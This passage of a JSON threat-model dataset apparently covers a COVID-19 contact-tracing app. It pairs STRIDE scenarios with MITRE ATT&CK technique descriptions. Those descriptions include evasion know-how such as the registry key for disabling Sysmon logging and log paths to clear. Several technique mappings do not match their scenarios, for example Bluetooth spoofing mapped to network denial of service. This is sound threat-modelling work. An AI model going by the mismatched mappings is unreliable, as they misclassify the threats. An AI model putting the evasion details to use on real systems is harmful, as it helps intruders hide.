                "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
                "id": "attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a",
                "technique_id": "T1527"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the identity of the central server in the centralized architecture to send fake exposure notifications to users.",
            "Assumptions": [
                {
                    "Assumption": "There is no mutual authentication between user devices and the central server.",
                    "Role": "System Architect",
                    "Condition": "Authentication mechanisms are weak or misconfigured."
                },
                {
                    "Assumption": "Attackers know the communication protocol between the app and server.",
                    "Role": "Attacker",
                    "Condition": "The protocol details are publicly available or poorly secured."
                }
            ],
            "Potential Impact": "Disruption to user trust and potential panic due to false exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "server",
                "fake notifications",
                "centralized architecture"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Users' Bluetooth signals could be spoofed to create fake contact records in the decentralized architecture.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth signals can be easily captured and replayed.",
                    "Role": "Attacker",
                    "Condition": "There is insufficient encryption of Bluetooth communication."
                },
                {
                    "Assumption": "Attackers are physically close enough to legitimate devices to capture and replay signals.",
                    "Role": "Attacker",
                    "Condition": "The attacker's device is within Bluetooth range."
                }
            ],
            "Potential Impact": "False positive contact records, compromising the accuracy of exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "Bluetooth",
                "contact records",
                "decentralized"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the central server and modifies health status records in the centralized architecture.",
            "Assumptions": [
                {
                    "Assumption": "The central server has weak or compromised access controls.",
                    "Role": "System Admin",
                    "Condition": "Access control policies are not strictly enforced or implemented."
                },
                {
                    "Assumption": "The attacker has knowledge of the server's data structure.",
                    "Role": "Attacker",
                    "Condition": "The server's database schema is poorly secured or documented."
                }
            ],
            "Potential Impact": "Corruption of health data, leading to inaccurate exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "central server",
                "health records",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could inject malicious code into the mobile app through a supply chain attack.",
            "Assumptions": [
                {
                    "Assumption": "The app's development process lacks stringent supply chain security measures.",
                    "Role": "Developer",
                    "Condition": "Security audits on third-party libraries and dependencies are inadequate."
                },
                {
                    "Assumption": "The attacker has access to the app's code repository or build system.",
                    "Role": "Attacker",
                    "Condition": "Repository access controls are weak or compromised."
                }
            ],
            "Potential Impact": "Compromise of app functionality, leading to unauthorized data access or malicious behavior.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "mobile app",
                "supply chain",
                "code injection"
            ],
            "mitre_technique": {
                "name": "Supply Chain Compromise",
                "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
                "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
                "technique_id": "T1195"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies log files on user devices to cover up their tracks.",
            "Assumptions": [
                {
                    "Assumption": "Log files are not adequately protected on user devices.",
                    "Role": "System Architect",
                    "Condition": "Insufficient file protection mechanisms are in place."
                },
                {
                    "Assumption": "The attacker has some form of access to the user's device.",
                    "Role": "Attacker",
                    "Condition": "The user's device has been compromised (e.g., via malware)."
                }
            ],
            "Potential Impact": "Loss of forensic evidence, making it difficult to trace malicious activities.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "logs",
                "mobile device",
                "evidence hiding"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having been at a location where they were potentially exposed, disputing the contact tracing data.",
            "Assumptions": [
                {
                    "Assumption": "Users have access to their recorded location history.",
                    "Role": "User",
                    "Condition": "The app provides transparency in data recording."
                },
                {
                    "Assumption": "There are inadequate non-repudiation mechanisms like secure logs or digital signatures.",
                    "Role": "System Architect",
                    "Condition": "Non-repudiation mechanisms are not implemented."
                }
            ],
            "Potential Impact": "Challenges in verifying exposure events and reduced confidence in the system.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "location data",
                "non-repudiation",
                "user denial"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker modifies server logs to erase traces of unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Log files on the central server are not write-protected.",
                    "Role": "System Admin",
                    "Condition": "Adequate log protection measures are not in place."
                },
                {
                    "Assumption": "The attacker has enough privileges to access and modify the logs.",
                    "Role": "Attacker",
                    "Condition": "The attacker's access level is high (e.g., administrative access)."
                }
            ],
            "Potential Impact": "Loss of auditing capabilities and inability to trace malicious activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "server logs",
                "access modification",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user claims their positive COVID-19 status was falsely reported, challenging the app's reliability.",
            "Assumptions": [
                {
                    "Assumption": "Users can view and challenge their health status within the app.",
                    "Role": "User",
                    "Condition": "The app provides a feedback mechanism for reporting discrepancies."
                },
                {
                    "Assumption": "There is no verification process to confirm positive test results before reporting them.",
                    "Role": "System Architect",
                    "Condition": "The reporting mechanism lacks sufficient validation checks."
                }
            ],
            "Potential Impact": "Eroded trust in the system and potential misuse of the feedback mechanism.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "health status",
                "system reliability",
                "user feedback"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Due to inadequate encryption, an attacker intercepts Bluetooth communications between user devices, capturing sensitive contact data.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communication is not sufficiently encrypted.",
                    "Role": "System Architect",
                    "Condition": "Encryption mechanisms are weak or not implemented."
                },
                {
                    "Assumption": "Attacker is within range of the Bluetooth communication.",
                    "Role": "Attacker",
                    "Condition": "The attacker is physically proximate to the target devices."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of users' interaction and proximity data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "Bluetooth",
                "data interception",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to the central server and exfiltrates sensitive user data.",
            "Assumptions": [
                {
                    "Assumption": "Central server is vulnerable to exploitation due to weak security measures.",
                    "Role": "System Admin",
                    "Condition": "Inadequate server hardening and security controls are in place."
                },
                {
                    "Assumption": "Attacker has knowledge of server vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Publicly known exploits or zero-day vulnerabilities are available."
                }
            ],
            "Potential Impact": "Compromise of user privacy due to the exposure of sensitive health and contact information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "central server",
                "sensitive data",
                "exfiltration"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Leaked rolling keys in the decentralized architecture allow an attacker to infer users' past interactions.",
            "Assumptions": [
                {
                    "Assumption": "Rolling keys are not adequately secured on the user's device.",
                    "Role": "System Architect",
                    "Condition": "Weak key storage mechanisms."
                },
                {
                    "Assumption": "Attacker can access the keys through device compromise.",
                    "Role": "Attacker",
                    "Condition": "User's device is compromised via malware or physical access."
                }
            ],
            "Potential Impact": "Exposure of historical interaction data compromising user privacy.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "rolling keys",
                "user interactions",
                "decentralized"
            ],
            "mitre_technique": {
                "name": "Upload Malware",
                "description": "Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.(Citation: Volexity Ocean Lotus November 2020)(Citation: Talos IPFS 2022)\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files.",
                "id": "attack-pattern--3ee16395-03f0-4690-a32e-69ce9ada0f9e",
                "technique_id": "T1608.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack against the central server, disrupting the contact tracing service.",
            "Assumptions": [
                {
                    "Assumption": "Central server can be overwhelmed by high traffic volumes.",
                    "Role": "System Admin",
                    "Condition": "The server lacks adequate DDoS protection mechanisms."
                },
                {
                    "Assumption": "Attacker has sufficient resources to generate large-scale traffic.",
                    "Role": "Attacker",
                    "Condition": "Availability of botnets or other means to create high traffic."
                }
            ],
            "Potential Impact": "Service unavailability, preventing the system from notifying users of potential exposures.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "central server",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Excessive exposure notifications due to false reports overload the system and confuse users.",
            "Assumptions": [
                {
                    "Assumption": "No adequate rate-limiting mechanism on exposure notifications.",
                    "Role": "System Architect",
                    "Condition": "Exposure notification handling lacks proper throttling."
                },
                {
                    "Assumption": "A user or attacker can repeatedly submit false positive results.",
                    "Role": "User/Attacker",
                    "Condition": "The reporting process lacks validation checks."
                }
            ],
            "Potential Impact": "User confusion and potential avoidance of the app due to excessive false positives.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "false notifications",
                "system overload",
                "rate limiting"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects user devices and prevents the contact tracing app from functioning properly.",
            "Assumptions": [
                {
                    "Assumption": "Users' devices do not have adequate malware protection.",
                    "Role": "User",
                    "Condition": "Anti-malware solutions are not installed or up-to-date."
                },
                {
                    "Assumption": "Malware specifically targets the app or its dependencies.",
                    "Role": "Attacker",
                    "Condition": "Malware is designed to disrupt the app's functionality."
                }
            ],
            "Potential Impact": "Loss of app functionality, hindering contact tracing efforts.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "app disruption",
                "availability"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user gains administrative access to other users' data on the central server by exploiting a vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "Server software contains a vulnerability that allows privilege escalation.",
                    "Role": "System Admin",
                    "Condition": "Vulnerability exists and is unpatched."
                },
                {
                    "Assumption": "User initiates an attack to exploit this vulnerability.",
                    "Role": "User/Attacker",
                    "Condition": "The attacker has some form of authenticated access."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user data, compromising privacy and data integrity.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "privilege escalation",
                "sensitive data",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious insiders with legitimate access to the central server manipulate access controls to view all user data.",
            "Assumptions": [
                {
                    "Assumption": "Insider threat is not adequately mitigated.",
                    "Role": "System Admin",
                    "Condition": "Access control and monitoring are weak or non-existent."
                },
                {
                    "Assumption": "Insider has the necessary access level to modify permissions.",
                    "Role": "Insider",
                    "Condition": "The insider holds a privileged role like an admin."
                }
            ],
            "Potential Impact": "Unauthorized data access and potential data leaks.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "access control",
                "data leak"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
